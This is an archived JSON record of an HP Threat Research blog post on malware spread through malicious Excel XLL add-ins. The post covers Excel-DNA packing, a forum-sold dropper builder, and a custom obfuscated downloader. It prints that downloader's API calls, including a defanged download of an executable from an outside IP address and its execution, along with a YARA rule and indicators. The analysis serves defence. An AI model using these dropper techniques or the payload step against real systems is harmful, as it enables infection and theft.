{
    "id": "b49c9a77-d419-446c-ade4-b6f4767a9666",
    "created_at": "2023-01-12T15:10:35.710483Z",
    "updated_at": "2025-03-27T02:05:24.099786Z",
    "deleted_at": null,
    "sha1_hash": "1705205032083b7c62b7cd0a697c84ab82e47d28",
    "title": "2022-01-14 - How Attackers Use XLL Malware to Infect Systems",
    "authors": "",
    "file_creation_date": "2022-05-28T19:09:24Z",
    "file_modification_date": "2022-05-28T19:09:24Z",
    "file_size": 2777856,
    "plain_text": "# Recent Posts\n\n**[threatresearch.ext.hp.com/how-attackers-use-xll-malware-to-infect-systems/](https://threatresearch.ext.hp.com/how-attackers-use-xll-malware-to-infect-systems/)**\n\n[HP Threat Research Blog • How Attackers Use XLL Malware to Infect Systems](https://threatresearch.ext.hp.com/blog/)\n\n## How Attackers Use XLL Malware to Infect Systems\n\n\nJanuary 14, 2022\n\n\nIn recent months, we have seen a growth in malware campaigns using malicious Microsoft\nExcel add-in (XLL) files to infect systems. This technique is tracked in MITRE ATT&CK as\n[T1137.006. The idea behind such add-ins is that they contain high-performance functions](https://attack.mitre.org/techniques/T1137/006/)\nand can be called from an Excel worksheet via an application programming interface (API).\nThis feature enables users to extend the functionality of Excel more powerfully compared to\nother scripting interfaces like Visual Basic for Applications (VBA) because it supports more\ncapabilities, such as multithreading. However, attackers can also make use of these\ncapabilities to achieve malicious objectives.\n\nIn the campaigns we saw, emails with malicious XLL attachments or links were sent to users.\nDouble-clicking the attachment opens Microsoft Excel, which prompts the user to install and\nactivate the add-in.\n\n\n-----\n\nFigure 1 – Prompt shown to user when opening an XLL file.\n\n[Attackers usually place their code in the xlAutoOpen function, which is executed immediately](https://docs.microsoft.com/en-us/office/client-developer/excel/xlautoopen)\nwhen the add-in is activated. What makes this technique dangerous is that only one click is\nrequired to run the malware, unlike VBA macros which require the user to disable Microsoft\nOffice’s Protected View and enable macro content. However, XLL files are portable\nexecutables that follow the format of dynamic link libraries (DLLs) which many email\ngateways already block. We recommend organizations consider the following mitigations:\n\nConfigure your email gateway to block inbound emails containing XLL attachments.\nConfigure Microsoft Excel to only permit add-ins signed by trusted publishers.\nConfigure Microsoft Excel to disable proprietary add-ins entirely.\n\n## XLL Malware for Sale\n\nThe rise in XLL attacks led us to search underground forums to gauge the popularity of\ntooling and services using this file format. We encountered adverts from one threat actor\nrepeatedly, who claimed to be selling a builder that creates XLL droppers.\n\n\n-----\n\nFigure 2 – Forum post advertising an XLL Excel dropper.\n\nThe user specifies an executable file or a link to one and adds a decoy document. An XLL\nfile is generated as output, which can then be used in attacks.\n\nFigure 3 – XLL Excel dropper user interface.\n\n## Excel-DNA Generated Add-Ins\n\nMost XLL samples we analyzed have the same structure. Essentially XLL files are DLLs\ncontaining an exported function called xlAutoOpen. The most common type of malicious XLL\n[files we see are those generated using a legitimate software project called Excel-DNA.](https://excel-dna.net/)\n\n\n-----\n\nLooking inside an XLL malware sample that follows this structure, you can see it contains\nseveral large resources (Figure 4).\n\nFigure 4 – Resources inside an XLL generated by Excel-DNA.\n\nThis includes Excel-DNA project components as well as the add-in, which in this case is a\nmalware dropper. You can identify the file that contains the Excel add-in code by looking at\nthe resource names or the XML definition file that is also stored in the resource section.\n\nFigure 5 – Excel-DNA XML definition.\n\nIn this sample, the add-in containing the malicious code is developed in .NET and is located\nin the MODDNA resource. To inspect the code, you first need to save this resource to disk\nand decompress it using the Lempel–Ziv–Markov chain algorithm (LZMA) algorithm. Since\nthe add-in is a .NET application, we can decompile it to retrieve its source code for further\nanalysis. Figure 6 shows the start function of an XLL add-in we analyzed which acts as a\nmalware downloader.\n\nFigure 6 – Malware .NET malware downloader extracted from an XLL file.\n\nXLL files created using the Excel-DNA project can also be unpacked automatically using a\nscript [provided by the project. The script takes the path of the XLL file as an argument and](https://github.com/augustoproiete/exceldna-unpack)\nthen extracts, unpacks and saves the resources to a folder.\n\n\n-----\n\nFigure 7 – Excel-DNA extraction script.\n\n## Custom Generated Add-Ins\n\nWe have also seen other types of XLL malware lately that don’t use Excel-DNA to generate\nadd-ins. One of these samples, a downloader, was particularly interesting because it was tiny\n(4.5 KB). Like the other XLL files, the file has the xlAutoOpen function exported. To disguise\nthe control flow of the application, many consecutive jmp instructions are executed.\n\nFigure 8 – jmp obfuscation in a custom malicous Excel add-in.\n\nTo understand how it works, we removed the jmp instructions and only analyzed relevant\ninstructions. We noticed that encrypted data is located in the file immediately after the\nexecutable code. The data is decrypted in a loop that first determines the position and size of\nthe data and then deobfuscates it using an XOR operation. After every 8 bytes the key is\nmultiplied and added to two different constants.\n\nFigure 9 – Decryption loop of custom Excel add-in.\n\n\n-----\n\nOnce the data is decrypted, it contains three DLL names, five API function names, the URL\nof the payload and the path to the local file where the payload is to be stored. With the\ndecrypted DLL names, the malware first correctly resolves the base addresses by traversing\nthe InLoadOrderModuleList via Process Environment Block (PEB) and then uses them to\nfind the addresses of API functions it wishes to call.\n\nFigure 10 – DLL module address resolution function.\n\nThe malware then uses the resolved API functions to download a payload from a web server,\nstore it locally and then execute it. In this example, the malware we analyzed made the\nfollowing API calls:\n\n1. GetProcAddress(“ExpandEnvironmentStringsW”)\n2. ExpandEnvironmentStringsW(“”%APPDATA%\\\\joludn.exe””)\n3. LoadLibraryW(“UrlMon”)\n4. GetProcAddress(“URLToDownloadFile”)\n5. URLToDownloadFile(“hxxp://141.95.107[.]91/cgi/dl/8521000125423.exe”,\n\n“C:\\\\Users\\\\REDACTED\\\\AppData\\\\Roaming\\\\joludn.exe”)\n6. _wsystem(“C:\\\\Users\\\\REDACTED\\\\AppData\\\\Roaming\\\\joludn.exe”)\n\n[The custom XLL malware can be tracked using the following YARA rule:](https://github.com/hpthreatresearch/tools/blob/main/xll/xll_custom_builder.yar)\n```\nrule xll_custom_builder\n{\n meta:\n  description = \"XLL Custom Builder\"\n  author = \"patrick.schlapfer@hp.com\"\n  date = \"2022-01-07\"\n strings:\n  $str1 = \"xlAutoOpen\"\n  $str2 = \"test\"\n  $op1 = { 4D 6B C9 00 }\n  $op2 = { 4D 31 0E }\n  $op3 = { 49 83 C6 08 }\n  $op4 = { 49 39 C6 }\n condition:\n  uint16(0) == 0x5A4D and all of ($str*) and all of ($op*) and filesize < 10KB\n}\n\n```\n\n-----\n\n## Conclusion\n\nMicrosoft Excel offers many legitimate ways to execute code, such as Excel4 macros,\nDynamic Data Exchange (DDE) and VBA, which are widely abused by attackers. Over the\nlast few months, we have seen malware families such as Dridex, Agent Tesla, Raccoon\nStealer and Formbook delivered using XLL files during the initial infection of systems. To\ncreate these files, the attackers most likely use a builder like the one advertised in the forum\nshown in Figure 1. We found that many malicious add-ins are generated using Excel-DNA,\nhowever, some XLL malware we analyzed was custom and made more use of encryption to\ndisguise its functionality. The increasing volume of XLL attacks in the last few months\nindicates that attackers are interested in exploring this technique, and that we may see more\nattackers favor XLL over other execution methods in the coming months.\n\n## Indicators of Compromise\n\n_XLL add-in built using Excel-DNA_\n\n380f15a57aee6d2e6f48ed36dd077be29aa3a3eb05bfb15a1a82b26cfedf6160\n\n_Custom XLL add-in_\n\nc314c7feeb98de6391da83678e1639aade3fbe9c95846b8c2f2590ea3d34dd4f\n\n[More XLL hashes can be found in our GitHub repository.](https://github.com/hpthreatresearch/iocs/blob/main/xll)\n\nTags\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-01-14 - How Attackers Use XLL Malware to Infect Systems.pdf"
    ],
    "report_names": [
        "2022-01-14 - How Attackers Use XLL Malware to Infect Systems.pdf"
    ],
    "threat_actors": [
        {
            "id": "bc6e3644-3249-44f3-a277-354b7966dd1b",
            "created_at": "2022-10-25T16:07:23.760559Z",
            "updated_at": "2025-03-27T02:02:09.968605Z",
            "deleted_at": null,
            "main_name": "Andariel",
            "aliases": [
                "APT 45",
                "Andariel",
                "Jumpy Pisces",
                "Onyx Sleet",
                "Operation BLACKMINE",
                "Operation BLACKSHEEP/Phase 3.",
                "Operation Blacksmith",
                "Operation DESERTWOLF/Phase 3",
                "Operation GHOSTRAT",
                "Operation GoldenAxe",
                "Operation INITROY/Phase 1",
                "Operation INITROY/Phase 2",
                "Operation Mayday",
                "Operation VANXATM",
                "Operation XEDA",
                "Plutonium",
                "Silent Chollima",
                "Stonefly"
            ],
            "source_name": "ETDA:Andariel",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536235,
    "ts_updated_at": 1743041124,
    "ts_creation_date": 1653764964,
    "ts_modification_date": 1653764964,
    "files": {
        "pdf": "https://archive.orkl.eu/1705205032083b7c62b7cd0a697c84ab82e47d28.pdf",
        "text": "https://archive.orkl.eu/1705205032083b7c62b7cd0a697c84ab82e47d28.txt",
        "img": "https://archive.orkl.eu/1705205032083b7c62b7cd0a697c84ab82e47d28.jpg"
    }
}